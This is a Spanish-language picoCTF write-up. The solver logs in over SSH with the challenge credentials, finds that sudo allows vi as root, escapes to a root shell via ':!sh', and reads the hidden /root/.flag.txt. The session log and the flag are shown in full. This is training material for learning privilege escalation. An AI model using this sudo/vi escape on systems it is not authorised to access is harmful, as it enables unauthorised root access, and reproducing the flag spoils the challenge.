### **Descripción**

Can you read files in the root file?The system admin has provisioned an account for you on the main server:`ssh -p 62659 picoplayer@saturn.picoctf.net`Password: `UYiOazkqY2`Can you login and read the root file?
## Solución

**Solución 1- usando python**
``` 
PS C:\Users\Usuario> ssh -p 62659 picoplayer@saturn.picoctf.net
The authenticity of host '[saturn.picoctf.net]:62659 ([13.59.203.175]:62659)' can't be established.
ED25519 key fingerprint is SHA256:HKm/Bw1C+mhj23vO8tXULrgLFYvzP6gQH2IwgUiQTok.
This host key is known by the following other names/addresses:
    C:\Users\Usuario/.ssh/known_hosts:6: [saturn.picoctf.net]:64616
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[saturn.picoctf.net]:62659' (ED25519) to the list of known hosts.
picoplayer@saturn.picoctf.net's password:
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 6.8.0-1044-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

picoplayer@challenge:~$ sudo -l
[sudo] password for picoplayer:
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
picoplayer@challenge:~$ sudo vi

# cd /root
# ls
# cat flag.txt
cat: flag.txt: No such file or directory
# ls -la /root
total 16
drwx------ 1 root root   22 Feb 19 20:42 .
drwxr-xr-x 1 root root   63 Feb 19 20:38 ..
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root   35 Aug  4  2023 .flag.txt
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
-rw------- 1 root root  557 Feb 19 20:42 .viminfo
# cat /root/.flag.txt
picoCTF{uS1ng_v1m_3dit0r_89e9cf1a}

```

#### NOTAS
- **Escalación de privilegios (PrivEsc):**  `vi` tenía permisos de superusuario para "escapar" a una shell de root usando `:!sh`.
    
- **Archivos ocultos:** los datos sensibles a veces están escondidos a simple vista mediante el uso de puntos iniciales en los nombres de archivo.